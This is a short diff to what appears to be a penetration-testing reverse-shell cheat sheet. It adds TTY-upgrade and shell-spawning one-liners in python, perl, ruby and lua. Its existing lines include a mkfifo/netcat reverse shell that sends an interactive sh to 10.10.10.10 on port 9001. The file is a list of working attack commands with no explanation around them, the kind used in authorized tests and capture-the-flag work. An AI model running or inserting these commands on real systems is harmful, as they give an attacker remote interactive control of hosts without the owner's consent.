@@ -1,6 +1,16 @@
 # https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#perl
 # https://www.revshells.com/
 
+# tty
+python2 -c "__import__('pty').spawn('/bin/bash')"
+python -c 'import pty; pty.spawn("/bin/sh")' 
+echo os.system('/bin/bash')
+/bin/sh -i
+perl -e 'exec "/bin/sh";'
+perl: exec "/bin/sh";
+ruby: exec "/bin/sh"
+lua: os.execute('/bin/sh')
+
 # nc not have -e
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.10.10 9001 >/tmp/f
 
